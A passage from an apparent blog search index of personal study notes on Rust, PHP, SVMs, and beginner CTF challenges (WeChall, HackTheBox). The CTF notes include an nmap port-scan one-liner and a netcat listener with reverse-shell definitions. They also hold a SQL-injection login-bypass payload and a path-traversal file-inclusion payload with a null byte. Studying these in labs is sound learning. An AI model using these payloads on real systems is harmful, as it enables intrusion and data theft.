scores.insert(String::from(\"Blue\"), 10); scores.insert(String::from(\"Yellow\"), 50);&#125; 123456789fn main() &#123; use std::collections::HashMap; let teams = vec![String::from(\"Blue\"), String::from(\"Yellow\")]; let initial_scores = vec![10, 50]; let mut scores: HashMap&lt;_, _&gt; = teams.into_iter().zip(initial_scores.into_iter()).collect();&#125; zipmethod to create a vector of tuplescollectmethod to turn that vector of tuples into a hash map, For types that implement the Copy trait, like i32, the valuesare copied into the hash map. For owned values like String, the values will be moved and the hash map will be the owner of those values 1234567891011fn main() &#123; use std::collections::HashMap; let mut scores = HashMap::new(); scores.insert(String::from(\"Blue\"), 10); scores.insert(String::from(\"Yellow\"), 50); let team_name = String::from(\"Blue\"); let score = scores.get(&amp;team_name);&#125; Some(&amp;10). The result is wrapped in Some because get returns an Option&lt;&amp;V&gt;no value get will return None. for (key, value) in &amp;scores { println!(&quot;{}: {}&quot;, key, value); } 123456789101112fn main() &#123; use std::collections::HashMap; let mut scores = HashMap::new(); scores.insert(String::from(\"Blue\"), 10); scores.entry(String::from(\"Yellow\")).or_insert(50); //entry检查值是否存在，返回Entry， or_insert是Entry的方法 return a mutable reference to the value 没有值插入 scores.entry(String::from(\"Blue\")).or_insert(50); println!(\"&#123;:?&#125;\", scores); //&#123;\"Yellow\": 50, \"Blue\": 10&#125;&#125; 1234567891011121314fn main() &#123; use std::collections::HashMap; let text = \"hello world wonderful world\"; let mut map = HashMap::new(); for word in text.split_whitespace() &#123; let count = map.entry(word).or_insert(0); //or_insert method actually returns a mutable reference (&amp;mut V) 所以可以加1 *count += 1; &#125; println!(\"&#123;:?&#125;\", map);&#125;","categories":[],"tags":[{"name":"RUST","slug":"RUST","permalink":"http://finsenty54.github.io/tags/RUST/"}]},{"title":"RUST学习2","slug":"RUST学习2","date":"2020-07-29T01:33:06.000Z","updated":"2020-07-29T01:34:09.636Z","comments":true,"path":"2020/07/29/RUST学习2/","link":"","permalink":"http://finsenty54.github.io/2020/07/29/RUST学习2/","excerpt":"rustAll data stored on the stack must have a known, fixed size.Data with an unknown size at compile time or a size that might change must be stored on the heap instead. Pushing tothe stack is faster than allocating on the heap because the allocator never has to search for a place to store new data;","text":"rustAll data stored on the stack must have a known, fixed size.Data with an unknown size at compile time or a size that might change must be stored on the heap instead. Pushing tothe stack is faster than allocating on the heap because the allocator never has to search for a place to store new data; Ownership Rules解决堆上数据 的问题 Each value in Rust has a variable that’s called its owner.There can only be one owner at a time.When the owner goes out of scope,the value will be dropped. 从堆中回收 string 存在scope中 the concept of copying the pointer, length, and capacity without copying the data probably sounds like making a shallow copy. rust1234let s1 = String::from(\"hello\"); | -- move occurs because `s1` has type `std::string::String`, which does not implement the `Copy` trait3 | let s2 = s1; | -- value moved here s1 无效 回收只s2 123456fn main() &#123; let s1 = String::from(\"hello\"); let s2 = s1.clone(); println!(\"s1 = &#123;&#125;, s2 = &#123;&#125;\", s1, s2);&#125; 12x=5y=x 栈中不用clone123456789101112131415fn main() &#123; let s = String::from(\"hello\"); // s comes into scope takes_ownership(s); // s's value moves into the function... // ... and so is no longer valid here let x = 5; // x comes into scope makes_copy(x); // x would move into the function, // but i32 is Copy, so it’s okay to still // use x afterward&#125; // Here, x goes out of scope, then s. But because s's value was moved, nothing // special happens. References and Borrowing引用 不拿所有权 也称借12345fn main() &#123; let mut s = String::from(\"hello\"); change(&amp;mut s);&#125; 123fn change(some_string: &amp;mut String) &#123; some_string.push_str(\", world\");&#125; 一个可变变量只能引用一次123456789fn main() &#123; let mut s = String::from(\"hello\"); &#123; let r1 = &amp;mut s; &#125; // r1 goes out of scope here, so we can make a new reference with no problems. let r2 = &amp;mut s;&#125; 用花括号创建一个空间，来引用， We also cannot have a mutable reference while we have an immutable one.可变变量有不变引用后，不能创建可变引用 1234567891011fn main() &#123; let mut s = String::from(\"hello\"); let r1 = &amp;s; // no problem let r2 = &amp;s; // no problem println!(\"&#123;&#125; and &#123;&#125;\", r1, r2); // r1 and r2 are no longer used after this point let r3 = &amp;mut s; // no problem println!(\"&#123;&#125;\", r3);&#125; 引用范围从创建到最后一次使用关键是不重叠 1234567891011fn main() &#123; let reference_to_nothing = dangle();&#125;fn dangle() -&gt; &amp;String &#123; // dangle returns a reference to a String let s = String::from(\"hello\"); // s is a new String &amp;s // we return a reference to the String, s&#125; // Here, s goes out of scope, and is dropped. Its memory goes away. // Danger! slice1234567891011fn first_word(s: &amp;String) -&gt; usize &#123; let bytes = s.as_bytes(); for (i, &amp;item) in bytes.iter().enumerate() &#123; if item == b' ' &#123; return i; &#125; &#125; s.len()&#125; iteris a method that returns each element in a collectionenumerate wraps the result of iter and returns each element as part of a tuple instead.第一个参数是索引值，第二个是值的引用 123456fn main() &#123; let s = String::from(\"hello world\"); let hello = &amp;s[0..5]; //0可以省去 let world = &amp;s[6..11]; 存6-10&#125; string slices12345678fn main() &#123;let s = String::from(\"hello\");let len = s.len();let slice = &amp;s[3..len];let slice = &amp;s[3..]; //相同&#125; The type that signifies “string slice” is written as &amp;str:1234567891011fn first_word(s: &amp;String) -&gt; &amp;str &#123; let bytes = s.as_bytes(); for (i, &amp;item) in bytes.iter().enumerate() &#123; if item == b' ' &#123; return &amp;s[0..i]; &#125; &#125; &amp;s[..]&#125; String Literals Are Slices固定字符串就是一种切片The type of s here is &amp;strit’s a slice pointing to that specific point of the binary fn first_word(s: &amp;str) -&gt; &amp;str {可以接受&amp;String 和 &amp;str //String 和 字符串 如“hello” 12345fn main() &#123;let a = [1, 2, 3, 4, 5];let slice = &amp;a[1..3];&#125; struct结构体字段里都是可变的12345678910111213141516171819202122struct User &#123; username: String, email: String, sign_in_count: u64, active: bool,&#125;struct User &#123; username: String, email: String, sign_in_count: u64, active: bool,&#125;fn main() &#123; let user1 = User &#123; email: String::from(\"someone@example.com\"), username: String::from(\"someusername123\"), active: true, sign_in_count: 1, &#125;;&#125; 顺序随便123456struct User &#123; username: String, email: String, sign_in_count: u64, active: bool,&#125; 12345678fn build_user(email: String, username: String) -&gt; User &#123; //返回struct 实例 User &#123; email: email, username: username, active: true, sign_in_count: 1, &#125;&#125; 123456fn main() &#123; let user1 = build_user( String::from(\"someone@example.com\"), String::from(\"someusername123\"), );&#125; 12345678fn build_user(email: String, username: String) -&gt; User &#123; User &#123; email, //省略rather than email: email. username, active: true, sign_in_count: 1, &#125;&#125; 更新赋予另一实例123456789101112131415161718192021struct User &#123; username: String, email: String, sign_in_count: u64, active: bool,&#125;fn main() &#123; let user1 = User &#123; email: String::from(\"someone@example.com\"), username: String::from(\"someusername123\"), active: true, sign_in_count: 1, &#125;; let user2 = User &#123; email: String::from(\"another@example.com\"), username: String::from(\"anotherusername567\"), ..user1 // .. specifies that the remaining fields not explicitly set should have the same value as the fields in the given instance. &#125;;&#125; tuple struct1234567fn main() &#123; struct Color(i32, i32, i32); struct Point(i32, i32, i32); let black = Color(0, 0, 0); let origin = Point(0, 0, 0);&#125; 做网站文件路径的一些通用规则： 若引用的目标文件与 HTML 文件同级，只需直接使用文件名，比如 my-image.jpg。要引用子文件夹中的文件，要在路径前写下目录名并加一个斜杠，比如 subdirectory/my-image.jpg。若引用的目标文件位于 HTML 文件的上级，需要加上两个点。比如，如果 index.html 在 test-site 下面的一个子目录而 my-image.png 在 test-site 目录，你可以在 index.html 里使用 ../my-image.png 引用 my-image.png。以上方法可以随意组合，比如 ../subdirectory/another-subdirectory/my-image.png。","categories":[],"tags":[{"name":"RUST","slug":"RUST","permalink":"http://finsenty54.github.io/tags/RUST/"}]},{"title":"RUST学习1","slug":"RUST学习1","date":"2020-07-27T07:38:11.000Z","updated":"2020-07-27T07:50:07.327Z","comments":true,"path":"2020/07/27/RUST学习1/","link":"","permalink":"http://finsenty54.github.io/2020/07/27/RUST学习1/","excerpt":"运行命令cargo doc --openrustup doccargo new --vcs=gitcargo buildcargo runcargo check更快编译，但不生成可执行文件cargo build --release 生成的执行文件运行更快benchmark基准测试","text":"运行命令cargo doc --openrustup doccargo new --vcs=gitcargo buildcargo runcargo check更快编译，但不生成可执行文件cargo build --release 生成的执行文件运行更快benchmark基准测试Variables and Mutabilitymutable 易变的 let mut x=5 rust默认变量不可变fn main() {const MAX_POINTS: u32 = 100_000;}const 整个运行时间都存在 fn main() { let spaces = “ “; let spaces = spaces.len();} Data Typesinterger 默认i32float 默认 f64char ‘’ 4字节Accented letters; Chinese, Japanese, and Korean characters; emoji; and zero-width spaces are all valid char values in Rust. string “” tuple 元组 固定 类型可以不同123456789101112fn main() &#123; let tup: (i32, f64, u8) = (500, 6.4, 1);&#125;fn main() &#123; let x: (i32, f64, u8) = (500, 6.4, 1); let five_hundred = x.0; let six_point_four = x.1; let one = x.2;&#125; array 数组 类型相同 固定 存在栈中123fn main() &#123; let a = [1, 2, 3, 4, 5];&#125; 1234fn main() &#123;let months = [\"January\", \"February\", \"March\", \"April\", \"May\", \"June\", \"July\", \"August\", \"September\", \"October\", \"November\", \"December\"];&#125; 123456789fn main() &#123;let a: [i32; 5] = [1, 2, 3, 4, 5];&#125;fn main() &#123;let a = [3; 5];&#125;let first = a[0]; rust会检查索引跃出 vector 不固定 Functions123456789fn main() &#123; println!(\"Hello, world!\"); another_function();&#125;fn another_function() &#123; println!(\"Another function.\");&#125; Rustdoesn’t carewhere you define your functions, only that they’re defined somewhere. 123456789fn main() &#123; another_function(5, 6);&#125;fn another_function(x: i32, y: i32) &#123; println!(\"The value of x is: &#123;&#125;\", x); println!(\"The value of y is: &#123;&#125;\", y);&#125; 必须声明参数类型 Statementsare instructions that perform some action and do not return a value.let y = 6; 无返回值不能赋给其他变量Expressions evaluate to a resulting value. 12345678910fn main() &#123; let x = 5; let y = &#123; let x = 3; x + 1 &#125;; println!(\"The value of y is: &#123;&#125;\", y);&#125; Note the x + 1 line without a semicolon at the end, which is unlike most of the lines you’ve seen so far. Expressions do not include ending semicolons. If you add a semicolon to the end of an expression, you turn it into a statement, which will then not return a value. 返回值123456789fn five() -&gt; i32 &#123; 5&#125;fn main() &#123; let x = five(); println!(\"The value of x is: &#123;&#125;\", x);&#125; 123456789fn main() &#123; let x = plus_one(5); println!(\"The value of x is: &#123;&#125;\", x);&#125;fn plus_one(x: i32) -&gt; i32 &#123; x + 1;&#125; Comments// control123456789fn main() &#123; let number = 3; if number &lt; 5 &#123; println!(\"condition was true\"); &#125; else &#123; println!(\"condition was false\"); &#125;&#125; Rust will not automatically try to convert non-Boolean types to a Boolean 12345678910111213fn main() &#123; let number = 6; if number % 4 == 0 &#123; println!(\"number is divisible by 4\"); &#125; else if number % 3 == 0 &#123; println!(\"number is divisible by 3\"); &#125; else if number % 2 == 0 &#123; println!(\"number is divisible by 2\"); &#125; else &#123; println!(\"number is not divisible by 4, 3, or 2\"); &#125;&#125; 123456fn main() &#123; let condition = true; let number = if condition &#123; 5 &#125; else &#123; 6 &#125;; println!(\"The value of number is: &#123;&#125;\", number);&#125; 循环12345678910111213141516171819fn main() &#123; loop &#123; println!(\"again!\"); &#125;&#125;fn main() &#123; let mut counter = 0; let result = loop &#123; counter += 1; if counter == 10 &#123; break counter * 2; &#125; &#125;; println!(\"The result is &#123;&#125;\", result);&#125; while1234567891011fn main() &#123; let mut number = 3; while number != 0 &#123; println!(\"&#123;&#125;!\", number); number -= 1; &#125; println!(\"LIFTOFF!!!\");&#125; for use a for loop and execute some code for each item in a collection1234567fn main() &#123; let a = [10, 20, 30, 40, 50]; for element in a.iter() &#123; println!(\"the value is: &#123;&#125;\", element); &#125;&#125; 123456fn main() &#123; for number in (1..4).rev() &#123; println!(\"&#123;&#125;!\", number); &#125; println!(\"LIFTOFF!!!\");&#125; rev, to reverse the range guess game . example123456fn main() &#123;let x = 5;let y = 10;println!(\"x = &#123;&#125; and y = &#123;&#125;\", x, y);&#125; cargo doc --open The trim method on a String instance will eliminate any whitespace at the beginning and end5\\n 变成 5The parse method on strings parses a string into some kind of number. cargo fmt 自动调整格式https://github.com/rust-lang/rustfmt","categories":[],"tags":[{"name":"RUST","slug":"RUST","permalink":"http://finsenty54.github.io/tags/RUST/"}]},{"title":"CTF入门 WECALL4+hackthebox-REVERSE","slug":"CTF入门 WECALL4+hackthebox-REVERSE","date":"2020-07-11T02:37:31.000Z","updated":"2020-07-11T02:40:05.281Z","comments":true,"path":"2020/07/11/CTF入门 WECALL4+hackthebox-REVERSE/","link":"","permalink":"http://finsenty54.github.io/2020/07/11/CTF入门 WECALL4+hackthebox-REVERSE/","excerpt":"wechall register_globalsregister_globals 在php 5.4.0 后被移除 其会自动生成各种变量 如html请求变量http://1.1.1.1/report.asp?id=123&amp;kehu=222login[0]=admin 直接login=admin 只取第一第二个字符 hacktheboxinvite challenge 浏览器console 下运行函数 加（）curl -X POST https://…","text":"wechall register_globalsregister_globals 在php 5.4.0 后被移除 其会自动生成各种变量 如html请求变量http://1.1.1.1/report.asp?id=123&amp;kehu=222login[0]=admin 直接login=admin 只取第一第二个字符 hacktheboxinvite challenge 浏览器console 下运行函数 加（）curl -X POST https://… hackthebox – Enumerationports=$(nmap -p- –min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d ‘/‘ -f 1 | tr ‘\\n’ ‘,’ | sed s/,$//)nmap -sC -sV -p$ports 10.10.10.27 command 1 | command 2 把第一个命令command 1执行的结果作为command 2的输入传给command 2-T4 可以加快执行速度-p- 扫描所有端口-min-rate 1000 to request that Nmap send at least 1,000 packets per secondcutcut Print selected parts of lines from each FILE to standard output.-f 指定第一列 -d 指定列分隔符 tr 命令用于转换或删除文件中的字符 ‘\\n’ 转换为‘，’sed ‘s/regexp/replacement/flags’.Its basic concept is simple: the s command attempts to match the pattern space against the supplied regular expression regexp; if the match is successful, then that portion of the pattern space which was matched is replaced with replacement.regexp匹配成功后用replace替代 select IS_SRVROLEMEMBER (‘sysadmin’) remote code execution (RCE) A reverse shellis a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved. Bind shellBind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machine’s listener which then leads to code or command execution on the server. netcatnc -lvnp 443 监听模式 443 外来请求 ollydbg显示当前EIP *执行到光标位置 F4F2 断点CALL 把接下来的地址先压入栈win 压入参数逆序 f(a,b) 先压b 后 atest = and 不改变操作数值 x64dbgfile test.py","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://finsenty54.github.io/tags/CTF/"}]},{"title":"CTF入门 WECALL2-正则","slug":"CTF入门 WECALL2","date":"2020-07-06T05:54:43.000Z","updated":"2020-07-06T06:01:18.207Z","comments":true,"path":"2020/07/06/CTF入门 WECALL2/","link":"","permalink":"http://finsenty54.github.io/2020/07/06/CTF入门 WECALL2/","excerpt":"python3list() 一个字符字符分 child[a],child[b] = child[b],child[a] 交换位置","text":"python3list() 一个字符字符分 child[a],child[b] = child[b],child[a] 交换位置 spilt() 按空格分int() Training: Crypto - Substitution Ihttp://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/ Training: Crypto - Caesar IIimport syssys.stdout = open(‘/root/Documents/CTF_WECALL/results.py’, mode = ‘w’,encoding=’utf-8’) 打印到文件中 line breaks. 换行符 vscode python 整段右移 选中tab python 2 转到 32to3.py 正则30分钟学习https://deerchao.cn/tutorials/regex/regex.htm wechall mysql 2‘ union select 1,’admin’ ,md5(‘1’) from users where username =’admin’# ？？可以随便选择 wechall WWW-Basicslsof -i:端口号 用于查看某一端口的占用情况，比如查看8000端口使用情况，lsof -i:8000 nginx -s quitps -ax | grep nginxlsof -i:80ip add","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://finsenty54.github.io/tags/CTF/"}]},{"title":"CTF入门 WECALL 2","slug":"CTF入门 WECALL1","date":"2020-05-19T12:03:39.000Z","updated":"2020-05-19T12:07:49.772Z","comments":true,"path":"2020/05/19/CTF入门 WECALL1/","link":"","permalink":"http://finsenty54.github.io/2020/05/19/CTF入门 WECALL1/","excerpt":"什么是PHP文件？PHP文件可以包含文本，HTML，CSS，JavaScript和PHP代码PHP代码在服务器上执行，结果以纯HTML格式返回到浏览器PHP文件的扩展名为“ .php”","text":"什么是PHP文件？PHP文件可以包含文本，HTML，CSS，JavaScript和PHP代码PHP代码在服务器上执行，结果以纯HTML格式返回到浏览器PHP文件的扩展名为“ .php” PHP可以做什么？PHP可以生成动态页面内容PHP可以在服务器上创建，打开，读取，写入，删除和关闭文件PHP可以收集表单数据PHP可以发送和接收CookiePHP可以添加，删除，修改数据库中的数据PHP可用于控制用户访问PHP可以加密数据使用PHP，您不仅可以输出HTML。您可以输出图像，PDF文件甚至Flash电影。您还可以输出任何文本，例如XHTML和XML。 PHP脚本可以放在文档中的任何位置。PHP脚本的开头&lt;?php和结尾是?&gt;：&lt;?php// PHP code goes here?&gt;PHP文件的默认文件扩展名是“ .php”。一个PHP文件通常包含HTML标记和一些PHP脚本代码。 PHP语句以分号（;）结尾。 在PHP中，关键字（例如if， else，while， echo等），类，函数，和用户定义的函数是不区分大小写。 所有变量名称均区分大小写！ comment//#/ / 在PHP中，变量以$符号开头，后跟变量名称 与其他编程语言不同，PHP没有用于声明变量的命令。它是在您首次为其分配值时创建的。 &lt;?php$txt = “W3Schools.com”;echo “I love $txt!”;?&gt; &lt;?php$txt = “W3Schools.com”;echo “I love “ . $txt . “!”;?&gt; &lt;?php$x = 5;$y = 4;echo $x + $y;?&gt; 在函数外部声明的变量具有全局范围，并且只能在函数外部访问在函数内声明的变量具有局部范围，只能在该函数内访问global关键字用于在函数内部访问一个全局变量。为此，请global在变量之前（在函数内部）使用关键字&lt;?php$x = 5;$y = 10;function myTest() { global $x, $y; $y = $x + $y;}myTest();echo $y; // outputs 15?&gt; PHP also stores all global variables in an array called $GLOBALS[index]. The index holds the name of the variable. This array is also accessible from within functions and can be used to update global variables directly. &lt;?php$x = 5;$y = 10;function myTest() { $GLOBALS[‘y’] = $GLOBALS[‘x’] + $GLOBALS[‘y’];}myTest();echo $y; // outputs 15?&gt; 通常，当一个函数完成/执行时，它的所有变量都会被删除。但是，有时我们希望不删除局部变量。我们需要它来做进一步的工作。为此，请static在首次声明变量时使用关键字然后，每次调用该函数时，该变量仍将具有自上次调用该函数以来所包含的信息。注意：该变量仍然是函数的局部变量。 差异很小：echo没有返回值，而print返回值为1，因此可以在表达式中使用。echo可以采用多个参数（尽管这种用法很少见），而print可以采用一个参数。echo比快一点print。 &lt;?phpecho “PHP is Fun!“;echo “Hello world!“;echo “I’m about to learn PHP!“;echo “This “, “string “, “was “, “made “, “with multiple parameters.”;?&gt; 字符串可以是引号内的任何文本。可以使用单引号或双引号整数数据类型是-2,147,483,648和2,147,483,647之间的非十进制数。PHP var_dump（）函数返回数据类型和值 &lt;?php$cars = array(“Volvo”,”BMW”,”Toyota”);var_dump($cars);?&gt; 首先，我们必须声明一个对象类。为此，我们使用class关键字。类是可以包含属性和方法的结构：&lt;?phpclass Car { function Car() { $this-&gt;model = “VW”; }}// create an object$herbie = new Car();// show object propertiesecho $herbie-&gt;model;?&gt; 如果创建的变量没有值，则会自动为其分配值NULL。也可以通过将值设置为NULL来清空变量： 关于PHP的注意事项之一是它提供了自动数据类型转换。因此，如果将整数值分配给变量，则该变量的类型将自动为整数。然后，如果将字符串分配给相同的变量，则类型将更改为字符串。 整数可以以三种格式指定：十进制（基于10的），十六进制（基于16的-带有0x前缀）或八进制（基于8的-带有0前缀） （int），（integer）或intval（）函数通常用于将值转换为整数。 有效的常量名称以字母或下划线开头（常量名称前没有$符号）。 注意：与变量不同，常量在整个脚本中自动为全局变量。define(name, value, case-insensitive)在PHP7中，您可以使用define()函数创建一个Array常量。 . Concatenation $txt1 . $txt2 Concatenation of $txt1 and $txt2.= Concatenation assignment $txt1 .= $txt2 Appends $txt2 to $txt1 &lt;?php$t = date(“H”); if ($t &lt; “20”) { echo “Have a good day!”;}?&gt; 该foreach循环仅适用于数组，用于循环遍历数组中的每个键/值对。句法foreach ($array as $value) { code to be executed;}对于每次循环迭代，当前数组元素的值都分配给$ value，并且数组指针移动一个，直到到达最后一个数组元素。 要指定，strict我们需要设置declare(strict_types=1);。这必须在PHP文件的第一行。这为我们提供了一个在声明函数时指定所需数据类型的选项，并且通过添加strict 声明，如果数据类型不匹配，它将抛出“致命错误”。 &lt;?php declare(strict_types=1); // strict requirementfunction addNumbers(float $a, float $b) : float { return $a + $b;}echo addNumbers(1.2, 5.2);?&gt; &lt;?php declare(strict_types=1); // strict requirementfunction addNumbers(float $a, float $b) : int { return (int)($a + $b);}echo addNumbers(1.2, 5.2);?&gt; &lt;?php$cars = array(“Volvo”, “BMW”, “Toyota”);echo “I like “ . $cars[0] . “, “ . $cars[1] . “ and “ . $cars[2] . “.”;?&gt; 关联数组是使用分配给它们的命名键的数组。有两种创建关联数组的方法：$age = array(“Peter”=&gt;”35”, “Ben”=&gt;”37”, “Joe”=&gt;”43”);要么：$age[‘Peter’] = “35”;$age[‘Ben’] = “37”;$age[‘Joe’] = “43”;然后可以在脚本中使用命名的键： $cars = array ( array(“Volvo”,22,18), array(“BMW”,15,13), array(“Saab”,5,2), array(“Land Rover”,17,15));&lt;?phpecho $cars[0][0].”: In stock: “.$cars[0][1].”, sold: “.$cars[0][2].”.“;echo $cars[1][0].”: In stock: “.$cars[1][1].”, sold: “.$cars[1][2].”.“;echo $cars[2][0].”: In stock: “.$cars[2][1].”, sold: “.$cars[2][2].”.“;echo $cars[3][0].”: In stock: “.$cars[3][1].”, sold: “.$cars[3][2].”.“;?&gt; sort() -以升序排列数组rsort() -以降序排列数组asort() -根据值以升序对关联数组进行排序ksort() -根据键以升序对关联数组进行排序arsort() -根据值以降序对关联数组进行排序krsort() -根据键以降序对关联数组进行排序 用于在使用method =“ post”提交HTML表单后收集表单数据。$ _POST也广泛用于传递变量。$_SERVER[‘PHP_SELF’] Returns the filename of the currently executing script$_SERVER[‘REQUEST_METHOD’] Returns the request method used to access the page (such as POST)PHP $ _GET是一个PHP超级全局变量，用于在使用method =“ get”提交HTML表单后收集表单数据。$ _GET还可以收集在URL中发送的数据。使用GET方法从表单发送的信息对所有人都是可见的（所有变量名和值都显示在URL中）。GET对发送的信息量也有限制。限制约为2000个字符。但是，由于变量显示在URL中，因此可以为页面添加书签。在某些情况下这可能很有用。GET可以用于发送非敏感数据。注意：绝对不要将GET用于发送密码或其他敏感信息！ 使用POST方法从表单发送的信息对于其他人是不可见的 （所有名称/值都嵌入在HTTP请求的正文中），并且对要发送的信息量没有限制。此外，POST支持高级功能，例如在将文件上传到服务器时支持多部分二进制输入。但是，由于变量未显示在URL中，因此无法为页面添加书签。 $ _ SERVER [“ PHP_SELF”]将提交的表单数据发送到页面本身，而不是跳转到另一个页面。这样，用户将在与表单相同的页面上收到错误消息。htmlspecialchars（）函数将特殊字符转换为HTML实体。这意味着它将用＆lt;替换&lt;和&gt;之类的HTML字符。和＆gt;。这样可以防止攻击者通过以表格形式注入HTML或Javascript代码（跨站点脚本攻击）来利用代码。 从用户输入数据中删除不必要的字符（多余的空格，制表符，换行符）（使用PHP trim（）函数）从用户输入数据中删除反斜杠（\\）（使用PHP stripslashes（）函数）使用PHP empty() 函数 12345678910111213&lt;form method=\"post\" action=\"&lt;?php echo htmlspecialchars($_SERVER[\"PHP_SELF\"]);?&gt;\"&gt;Name: &lt;input type=\"text\" name=\"name\"&gt;&lt;span class=\"error\"&gt;* &lt;?php echo $nameErr;?&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;E-mail:&lt;input type=\"text\" name=\"email\"&gt;&lt;span class=\"error\"&gt;* &lt;?php echo $emailErr;?&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;Website:&lt;input type=\"text\" name=\"website\"&gt;&lt;span class=\"error\"&gt;&lt;?php echo $websiteErr;?&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;Comment: &lt;textarea name=\"comment\" rows=\"5\" cols=\"40\"&gt; preg_match（）函数在字符串中搜索模式，如果存在模式，则返回true，否则返回false。正则表达式 include和require语句相同，但失败时除外：require 将产生致命错误（E_COMPILE_ERROR）并停止脚本 include 只会产生警告（E_WARNING）并且脚本将继续该readfile()函数读取文件并将其写入输出缓冲区。 &lt;?php$myfile = fopen(“webdictionary.txt”, “r”) or die(“Unable to open file!”);echo fread($myfile,filesize(“webdictionary.txt”));fclose($myfile);?&gt; 该fclose()功能用于关闭打开的文件。结束所有文件后，关闭所有文件是一种良好的编程习惯。您不希望在服务器上到处运行打开的文件占用资源！ 该feof()功能检查是否已达到“文件结尾”（EOF）。 该fopen()函数还用于创建文件。可能有些混乱，但是在PHP中，使用与打开文件相同的功能创建文件。 $filename = ‘pages/‘.(isset($_GET[“file”])$_GET[“file”]:”welcome”).’.html’; ？ ： isset（）函数检查是否设置了变量，这意味着必须声明该变量并且该变量不能为NULL。die（）函数是exit（）函数的别名。 eval（）函数将字符串评估为PHP代码。dirname（）函数返回父目录的路径。in_array（）函数在数组中搜索特定值。注意：如果搜索参数是字符串，并且类型参数设置为TRUE，则搜索区分大小写。 WECHALL LFI?file=page/jhkd.html?file=../../solution.php%00%00 后的字符不算，已经更改../ 遍历目录 switch ($which) { case 0: case 1: case 2: require_once $which.’.php’; break; default: echo GWF_HTML::error(‘PHP-0817’, ‘Hacker NoNoNo!’, false); break; }which=0,1,2 都执行require_once","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://finsenty54.github.io/tags/CTF/"}]},{"title":"CTF入门 WECALL","slug":"CTF入门 WECALL","date":"2020-05-15T11:24:57.000Z","updated":"2020-05-15T11:26:23.799Z","comments":true,"path":"2020/05/15/CTF入门 WECALL/","link":"","permalink":"http://finsenty54.github.io/2020/05/15/CTF入门 WECALL/","excerpt":"初学CTF 入门太难 wecall challenges 解决方法training steganoI$cat xxx.bmphttps://www.tecmint.com/13-basic-cat-command-examples-in-linux/ Crypto - Caesar Ipython函数 list() ord() chr()","text":"初学CTF 入门太难 wecall challenges 解决方法training steganoI$cat xxx.bmphttps://www.tecmint.com/13-basic-cat-command-examples-in-linux/ Crypto - Caesar Ipython函数 list() ord() chr() WWW-Robotsrobots.txtThe robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.Sometimes these files reveal the directory structure instead protecting the content from being crawled. URL ENCODEURL encoding replaces unsafe ASCII characters with a “%” followed by two hexadecimal digits. 十六进制URLs cannot contain spaces. URL encoding normally replaces a space with a plus (+) sign or with %20.URLs can only be sent over the Internet using the ASCII character-set. python 3.7from urllib.parse import unquotetar -xf 解压缩 ？自动识别java -jar Training: Programming 1urllib.request urlopen返回的是二进制数据，decode(‘utf-8’)解码 正则表达式https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F ‘weshall’ wechall4?.(jpg|gif|tiff|bmp|png)","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://finsenty54.github.io/tags/CTF/"}]},{"title":"SVM学习笔记2","slug":"SVM学习笔记2","date":"2020-04-01T12:17:15.000Z","updated":"2020-04-01T12:18:45.372Z","comments":true,"path":"2020/04/01/SVM学习笔记2/","link":"","permalink":"http://finsenty54.github.io/2020/04/01/SVM学习笔记2/","excerpt":"凸二次规划 == 开口向下 分类靠支撑向量计算 其 a~=0","text":"凸二次规划 == 开口向下 分类靠支撑向量计算 其 a~=0 hard-margin soft-margin 容忍一些误差每个容忍值和希望最小 KKT帮助确定a ， L函数系数 拉格朗日 K-fold 数据分成k份进行train test获取最佳参数 调用crossval就是要找到参数C(惩罚系数)和sigma，使误分率mcr最小 one vs one多类判定投票 one vs all有符号距离取最大 才发现 matlab %%%%运行节 代码参考 http://www.matlabsky.com/thread-11026-1-1.html fitcsvm()使用&#39;OptimizeHyperparameters&#39;- 要优化的参数 和&#39;HyperparameterOptimizationOptions&#39; - 优化的选项来找到最佳sigma 和 C 罚因子","categories":[],"tags":[{"name":"SVM","slug":"SVM","permalink":"http://finsenty54.github.io/tags/SVM/"}]},{"title":"SVM学习笔记1","slug":"SVM学习笔记1","date":"2020-03-31T09:06:21.000Z","updated":"2020-03-31T11:35:13.640Z","comments":true,"path":"2020/03/31/SVM学习笔记1/","link":"","permalink":"http://finsenty54.github.io/2020/03/31/SVM学习笔记1/","excerpt":"https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0s参考视频课程 mvnrnd（）产生特定均值和协方差的矩阵","text":"https://m.youtube.com/watch?v=Hu71tIm1iX0&amp;list=PLt0SBi1p7xrRKE2us8doqryRou6eDYEOy&amp;index=9&amp;t=0s参考视频课程 mvnrnd（）产生特定均值和协方差的矩阵 kenel 矩阵要有限正半定，kenel函数：R^d-&gt;R 常见kenel 可以自己构造 REPRODUCING KENEL MAP由kenel 推出 feature mapping 以及其逆 Principal Component Analysis 主成分分析KPCA Linear Discriminant Analysis 線性區別分析投影坐标：内积*v廣義區別分析(Generalized Discriminant Analysis)。 KKT svm证明中会用到 其他 https://ww2.mathworks.cn/help/matlab/data-type-conversion.htmlmatlab 数据类型转换 &lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Ap0huJwyT7g&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; 